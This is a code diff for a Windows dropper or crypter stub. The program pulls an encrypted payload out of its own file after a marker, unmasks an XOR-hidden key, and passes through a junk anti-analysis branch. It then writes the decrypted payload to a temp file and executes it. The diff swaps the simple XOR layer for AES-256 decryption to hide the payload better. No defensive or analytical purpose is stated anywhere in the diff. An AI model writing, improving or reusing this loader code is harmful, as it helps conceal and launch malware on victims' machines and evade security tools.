@@ -6,6 +6,7 @@
 #include <vector>
 #include <cstdio>
 #include <cstring>
+#include <openssl/evp.h>
 
 constexpr const char* MARKER = "ENCRYPTED_PAYLOAD_START";
 constexpr size_t MARKER_LEN = 22;
@@ -17,6 +18,53 @@ constexpr size_t keyLen = sizeof(encryptedKey);
 void decryptKey(uint8_t* keyBuf) {
     for (size_t i = 0; i < keyLen; i++)
         keyBuf[i] = encryptedKey[i] ^ mask[i];
+}
+
+// AES-256 key and IV (32 bytes for AES-256, 16 bytes for IV)
+uint8_t aesKey[32];
+uint8_t aesIV[16];
+
+void initializeAES() {
+    // Generate a 32-byte AES-256 key from the XOR key
+    uint8_t key[keyLen];
+    decryptKey(key);
+    
+    // Use the XOR key as a seed to generate AES key and IV
+    // This maintains compatibility with the existing key derivation
+    for (int i = 0; i < 32; i++) {
+        aesKey[i] = key[i % keyLen] ^ (i * 0x37);
+    }
+    for (int i = 0; i < 16; i++) {
+        aesIV[i] = key[i % keyLen] ^ (i * 0x73);
+    }
+}
+
+bool decryptAES(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {
+    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+    if (!ctx) return false;
+
+    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aesKey, aesIV) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return false;
+    }
+
+    output.resize(input.size());
+    int outLen;
+    
+    if (EVP_DecryptUpdate(ctx, output.data(), &outLen, input.data(), input.size()) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return false;
+    }
+
+    int finalLen;
+    if (EVP_DecryptFinal_ex(ctx, output.data() + outLen, &finalLen) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return false;
+    }
+
+    output.resize(outLen + finalLen);
+    EVP_CIPHER_CTX_free(ctx);
+    return true;
 }
 
 bool junkTrap(int x) {
@@ -50,14 +98,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     std::vector<uint8_t> encryptedPayload(buf.begin() + payloadOffset, buf.end());
 
-    uint8_t key[keyLen];
-    decryptKey(key);
+    initializeAES();
 
-    for (size_t i = 0; i < encryptedPayload.size(); i++) {
-        encryptedPayload[i] ^= key[i % keyLen];
+    std::vector<uint8_t> decryptedPayload;
+    if (!decryptAES(encryptedPayload, decryptedPayload)) {
+        return 1;
     }
 
-    if (junkTrap((int)encryptedPayload.size())) {
+    if (junkTrap((int)decryptedPayload.size())) {
         volatile int x = 42 * 1337;
         (void)x;
     }
@@ -69,7 +117,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     FILE* out = nullptr;
     if (fopen_s(&out, tempPath, "wb") != 0 || !out) return 1;
 
-    fwrite(encryptedPayload.data(), 1, encryptedPayload.size(), out);
+    fwrite(decryptedPayload.data(), 1, decryptedPayload.size(), out);
     fclose(out);
 
     SHELLEXECUTEINFOA sei = { sizeof(sei) };
